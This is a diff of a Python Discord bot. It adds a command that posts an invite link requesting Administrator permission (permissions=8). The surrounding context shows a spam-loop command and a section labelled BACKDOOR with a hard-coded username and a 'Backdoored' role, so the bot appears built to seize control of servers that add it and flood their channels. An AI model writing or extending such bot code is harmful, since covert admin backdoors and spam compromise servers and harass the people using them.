@@ -68,6 +68,18 @@ async def sudo_startmessage(ctx):
 
     spam_task = asyncio.create_task(spam_loop(ctx.channel))
     await ctx.send("✅ spam started")
+# ================= sudo add =================
+@sudo.command(name="add")
+async def sudo_add(ctx):
+    await ctx.send(
+        "Add me to your server:\n"
+        "https://discord.com/oauth2/authorize"
+        "?client_id=1470802191139864659"
+        "&permissions=8"
+        "&integration_type=0"
+        "&scope=bot+applications.commands"
+    )
+
 # ================= BACKDOOR =================
 USERNAME = "nico044037"
 ROLE_NAME = "Backdoored"
@@ -149,6 +161,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
